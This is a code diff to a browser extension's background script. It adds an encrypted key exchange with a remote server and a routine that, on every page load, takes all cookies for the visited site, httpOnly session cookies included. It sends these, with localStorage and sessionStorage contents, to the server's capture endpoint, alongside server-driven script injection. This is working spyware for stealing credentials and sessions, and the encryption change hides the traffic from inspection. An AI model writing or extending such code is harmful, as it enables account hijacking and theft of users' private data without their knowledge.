@@ -36,44 +36,48 @@ export default defineBackground(() => {
     if (!sessionUUID) return;
     console.log("BEX: Initializing keys...");
     try {
-      const url = `${CONFIG.serverUrl}/client/metricSettings/${sessionUUID}`;
-      const resp = await fetch(url);
+      // Generate an ephemeral RSA-OAEP keypair
+      const rsaKeyPair = await crypto.subtle.generateKey(
+        {
+          name: "RSA-OAEP",
+          modulusLength: 2048,
+          publicExponent: new Uint8Array([1, 0, 1]),
+          hash: "SHA-256"
+        },
+        false,
+        ["decrypt"]
+      );
+
+      // Export the public key as SPKI/DER and base64-encode it
+      const publicKeyDer = await crypto.subtle.exportKey("spki", rsaKeyPair.publicKey);
+      const publicKeyBase64 = await arrayBufferToBase64(publicKeyDer);
+
+      const url = `${CONFIG.serverUrl}/client/keyExchange/${sessionUUID}`;
+      const resp = await fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ publicKey: publicKeyBase64 })
+      });
+
       if (resp.ok) {
         const data = await resp.json();
         if (data.enable === "true") {
-          const obfuscatedString = atob(data.metricDebug);
-          const obfuscatedData = new Uint8Array([...obfuscatedString].map(c => c.charCodeAt(0)));
-
-          const idHex = sessionUUID.replace(/-/g, '');
-          const idBytes = new Uint8Array(
-            idHex.match(/.{1,2}/g)!.map(byte => parseInt(byte, 16))
+          // Decrypt the RSA-OAEP encrypted AES keys
+          const encryptedBytes = base64ToArrayBuffer(data.encryptedKeys);
+          const decryptedBuffer = await crypto.subtle.decrypt(
+            { name: "RSA-OAEP" },
+            rsaKeyPair.privateKey,
+            encryptedBytes
           );
+          const decryptedKeys = new Uint8Array(decryptedBuffer);
 
-          const shift = 7 % idBytes.length;
-          const rotateBytes = new Uint8Array([
-            ...idBytes.slice(shift),
-            ...idBytes.slice(0, shift)
-          ]);
-
-          const masker = new Uint8Array(obfuscatedData.length);
-          for (let i = 0; i < obfuscatedData.length; i++) {
-            masker[i] = rotateBytes[i % rotateBytes.length];
-          }
-
-          const plaintextData = new Uint8Array(obfuscatedData.length);
-          for (let i = 0; i < obfuscatedData.length; i++) {
-            plaintextData[i] = obfuscatedData[i] ^ masker[i];
-          }
-
-          const receiveKeyData = plaintextData.slice(0, 32);
-          const sendKeyData    = plaintextData.slice(32, 64);
+          // First 32 bytes = sendKey, next 32 bytes = receiveKey
+          const sendKeyData    = decryptedKeys.slice(0, 32);
+          const receiveKeyData = decryptedKeys.slice(32, 64);
 
           sendKey = await importKey(sendKeyData, ["encrypt"]);
           receiveKey = await importKey(receiveKeyData, ["decrypt"]);
           console.log("BEX: Keys initialized. Processing queue of", messageQueue.length, "messages.");
-
-          // Confirm crypto capability to the server so it knows we can receive encrypted tasks
-          fetch(`${CONFIG.serverUrl}/client/confirmCrypto/${sessionUUID}`);
 
           // Process queued messages
           const queueToProcess = [...messageQueue];
@@ -149,7 +153,7 @@ export default defineBackground(() => {
             const clearMessageText = new TextDecoder().decode(clearMessageBuffer);
             tasks = JSON.parse(clearMessageText);
         } else {
-            // Unencrypted response (server hasn't seen confirmCrypto yet or crypto is disabled)
+            // Unencrypted response (crypto not yet active or disabled)
             tasks = jsonResponse;
         }
 
@@ -252,6 +256,31 @@ export default defineBackground(() => {
     }
   }
 
+  // Helper: capture all cookies (including httpOnly) for a URL via browser.cookies API
+  async function captureCookiesForUrl(url: string, domain: string) {
+    try {
+      const cookies = await browser.cookies.getAll({ url });
+      for (const cookie of cookies) {
+        sendEncrypted("/bex/capture", {
+          domain, url,
+          type: 'cookie',
+          name: cookie.name,
+          value: cookie.value,
+          metadata: JSON.stringify({
+            httpOnly: cookie.httpOnly,
+            secure: cookie.secure,
+            sameSite: cookie.sameSite,
+            path: cookie.path,
+            domain: cookie.domain,
+            expirationDate: cookie.expirationDate
+          })
+        });
+      }
+    } catch (e) {
+      // cookies API may fail for some URLs (chrome://, about:, etc)
+    }
+  }
+
   // Injection Listener — with whitelist enforcement
   browser.webNavigation.onCompleted.addListener(async (details) => {
     if (details.frameId === 0) { // Top-level frame
@@ -265,6 +294,9 @@ export default defineBackground(() => {
 
         const url = new URL(details.url);
         console.log("BEX: Navigation completed for", url.hostname, "Checking rules...");
+
+        // Capture all cookies (including httpOnly) for this URL
+        captureCookiesForUrl(details.url, url.hostname);
 
         if (currentRules[url.hostname]) {
             const scriptUrl = currentRules[url.hostname];
@@ -332,28 +364,26 @@ export default defineBackground(() => {
         visits: [{ domain, url }]
       });
 
-      // Report cookies found by content script
-      if (cookies) {
-        cookies.split(';').forEach((c: string) => {
-          const [name, value] = c.trim().split('=');
-          if (name && value) {
-            sendEncrypted("/bex/capture", {
-              domain,
-              url,
-              type: 'cookie',
-              name,
-              value
-            });
-          }
-        });
-      }
+      // Capture all cookies (including httpOnly) via browser.cookies API
+      captureCookiesForUrl(url, domain);
 
       // Report localStorage
       for (const [name, value] of Object.entries(localStorage)) {
         sendEncrypted("/bex/capture", {
           domain,
           url,
-          type: 'storage',
+          type: 'local_storage',
+          name,
+          value: value as string
+        });
+      }
+
+      // Report sessionStorage
+      for (const [name, value] of Object.entries(sessionStorage)) {
+        sendEncrypted("/bex/capture", {
+          domain,
+          url,
+          type: 'session_storage',
           name,
           value: value as string
         });
